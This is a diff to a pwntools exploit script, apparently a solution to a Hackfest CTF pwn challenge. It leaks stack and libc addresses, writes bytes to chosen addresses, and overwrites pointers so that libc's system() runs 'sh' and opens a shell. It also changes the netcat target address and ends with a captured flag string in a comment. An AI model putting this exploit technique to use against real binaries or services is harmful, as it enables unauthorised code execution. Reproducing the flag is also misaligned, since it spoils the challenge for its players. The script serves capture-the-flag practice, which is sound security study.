@@ -11,7 +11,7 @@ context.binary = exe
 
 sshc = None
 r = None
-nc = "nc 20.7.158.184 1339"#172.17.0.2 5000"#
+nc = "nc 172.17.0.3 5000"#172.17.0.2 5000"#
 ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
 SLEEP_TIME = 0.8
 
@@ -125,19 +125,22 @@ def main():
     controlled_ptr = stack_leak + 0x170 + 0x200
     logh("controlled_ptr", controlled_ptr)
     
-    # target offset: 0x5038
-    
     writeByteInAdr(counter+3, 0xf0)
     
-    #pause()
-    for idx, c in enumerate(list("/bin/sh")):
+    for idx, c in enumerate(list("sh\0")):
         writeByteInAdr(rdi_adr+idx, ord(c))
     
+    # Method 1, 
+    #call_adr = ld_base + 0x2ef70
+    #writeQWORD(call_adr, libc_base+libc.symbols.system)
+    
+    # Method 2
     offset = controlled_ptr - 0x3d90
     logh("offset", offset)
     
     writeQWORD(pie_base_ptr, offset)
     writeQWORD(controlled_ptr, libc_base+libc.symbols.system)
+    # End
     
     # Set back counter to positive to end loop
     writeByteInAdr(counter+3, 0) # hackfest{375b68ef0a0ea3f7f752932a7f39eb1bfbe01d91c5bf87f1013d49008b941332}
